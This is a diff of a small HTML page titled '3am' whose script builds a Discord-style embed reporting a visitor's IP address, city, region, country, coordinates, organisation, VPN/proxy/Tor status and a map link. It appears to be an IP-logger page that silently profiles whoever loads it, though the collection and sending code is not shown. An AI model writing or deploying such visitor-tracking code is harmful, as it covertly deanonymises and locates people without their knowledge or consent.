@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">  
-    <title>3am v2</title>
+    <title>3am v1</title>
 </head>
 <body>
     <script>
@@ -35,22 +35,26 @@
                         {
                             name: "",
                             value: 
-                                "**IP Address**\n" + 
-                                "`" + (info.ip || 'N/A') + "`\n\n" +
-                                "**Location**\n" + 
-                                "`City:         " + (info.city || 'N/A') + "`\n" + 
-                                "`Region:       " + (info.region || 'N/A') + "`\n" + 
-                                "`Country:      " + (info.country || 'N/A') + "`\n" + 
-                                "`Coordinates:  " + (info.loc || 'N/A') + "`\n\n" +
-                                "**Organization**\n" + 
-                                "`Org:          " + (info.org || 'N/A') + "`\n\n" +
-                                "**Privacy Details**\n" + 
-                                "`VPN:          " + (info.privacy?.vpn ? "True" : "False") + "`\n" + 
-                                "`Proxy:        " + (info.privacy?.proxy ? "True" : "False") + "`\n" + 
-                                "`Tor:          " + (info.privacy?.tor ? "True" : "False") + "`\n" + 
-                                "`Relay:        " + (info.privacy?.relay ? "True" : "False") + "`\n" + 
-                                "`Provider:     " + (info.privacy?.service || 'N/A') + "`\n\n" + 
-                                "`**Map:** [View on OpenStreetMap](${mapUrl})`",
+                                `**IP Address**
+                                \`${info.ip || 'N/A'}\`
+                    
+                                **Location**
+                                \`City:         ${info.city || 'N/A'}\`
+                                \`Region:       ${info.region || 'N/A'}\`
+                                \`Country:      ${info.country || 'N/A'}\`
+                                \`Coordinates:  ${info.loc || 'N/A'}\`
+                    
+                                **Organization**
+                                \`Org:          ${info.org || 'N/A'}\`
+                    
+                                **Privacy Details**
+                                \`VPN:          ${info.privacy?.vpn ? "True" : "False"}\`
+                                \`Proxy:        ${info.privacy?.proxy ? "True" : "False"}\`
+                                \`Tor:          ${info.privacy?.tor ? "True" : "False"}\`
+                                \`Relay:        ${info.privacy?.relay ? "True" : "False"}\`
+                                \`Provider:     ${info.privacy?.service || 'N/A'}\`
+                    
+                                **Map:** [View on OpenStreetMap](${mapUrl})`,
                             inline: false
                         }
                     ],
